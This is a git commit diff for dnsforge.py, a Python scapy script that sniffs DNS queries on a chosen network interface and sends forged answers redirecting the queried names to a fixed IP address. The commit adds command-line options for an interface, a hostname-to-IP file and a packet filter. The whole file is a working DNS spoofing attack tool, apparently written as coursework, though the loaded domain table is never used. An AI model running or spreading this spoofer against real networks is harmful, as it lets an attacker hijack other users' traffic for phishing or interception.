8e70ea7cb9b3d18e4fcece376469b52f04f5f28d
anish19 <hoopanish@gmail.com>
2016-05-08 20:05:24 -0400

    pyhton dnsforge and ipfile

--- dnsforge.py
+++ dnsforge.py
@@ -1,17 +1,52 @@
 #! /usr/bin/env python
 from scapy.all import *
 import netifaces
+import getopt
 
 changeToIp = "173.252.89.132"
-dnsQueryDName = "abc.com"
+dnsQueryDName = "domp.com"
+interface = ""
+filename = ""
+BPFfilter = ""
+domainTable = {}
 
 def arp_monitor_callback(pkt):
+	print pkt
 	spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
 		/UDP(dport=pkt[UDP].sport, sport=53)\
-		/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=changeToIp)\
-		/DNSRR(rrname=dnsQueryDName,rdata=changeToIp))
+		/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp)\
+		/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp))
 	send(spfResp,verbose=0)
 	return "Spoofed DNS Response Sent"
 
-sniff(iface=interface'eth1',prn=arp_monitor_callback, filter="port 53", store=0)
+interfaces = netifaces.interfaces()
+interface = interfaces[1]
+opts, remainder = getopt.getopt(sys.argv[1:], "i:f:")
+
+for opt, arg in opts:
+	if opt in ('-i'):
+		interface = arg
+	elif opt in ('-f'):
+		filename = arg
+
+BPFfilter = " ".join(str(x) for x in remainder)
+
+print "interface is ", interface
+
+if len(filename) > 0:
+	print "filename is ", filename
+	with open(filename) as f:
+	    for line in f:
+		ip, domain = line.split()
+		domainTable[domain] = ip
+	print domainTable
+
+if len(BPFfilter) > 0: 
+	print "BPFfilter is ", BPFfilter
+	if "dst port 53" in BPFfilter:
+		print "Cannot enter dst port 53 as a BPF filter"
+		print "Please try again"
+		exit()
+
+sniff(iface=interface,prn=arp_monitor_callback, filter="dst port 53", store=0)
 
